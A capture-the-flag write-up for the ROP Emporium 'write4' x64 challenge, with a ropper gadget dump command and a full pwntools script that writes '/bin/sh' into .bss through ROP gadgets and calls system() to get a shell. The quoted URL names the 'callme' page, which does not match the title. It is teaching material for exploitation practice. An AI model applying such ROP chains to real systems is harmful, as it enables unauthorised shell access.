# write4

> Our first foray into proper gadget use. A call to system() is still present but we'll need to write a string into memory somehow.
> Click below to download the binary.
>
> Url: https://ropemporium.com/challenge/callme.html



### x64 Solution

We must write a string, like **/bin/sh**, in memory and then call system with it to print the flag.



```bash
~$ ropper -f write4-64 > write4_64-gadgets.txt
```

![](Images/gadgets.png)



```python
from pwn import *


elf = ELF('./write4-64')

context.terminal=['tmux','sp','-h']
#context.log_level='DEBUG'

bss_pointer=0x601068 #0000000000601060 l    d  .bss

io=process(elf.path)
payload= flat(
        'A'*40 ,
        0x400890, #0x0000000000400890: pop r14; pop r15; ret; 
        bss_pointer,
        '/bin/sh\x00', #string to write
        0x400818, #0x0000000000400818: nop dword ptr [rax + rax]; mov qword ptr [r14], r15; ret; 
        0x400893, #0x0000000000400893: pop rdi; ret;
        bss_pointer,
        elf.sym['system'],
        endianness='little',word_size=64,sign=False)

io.recvuntil('> ')
io.sendline(payload)
io.interactive()
```

![](Images/flag.png)

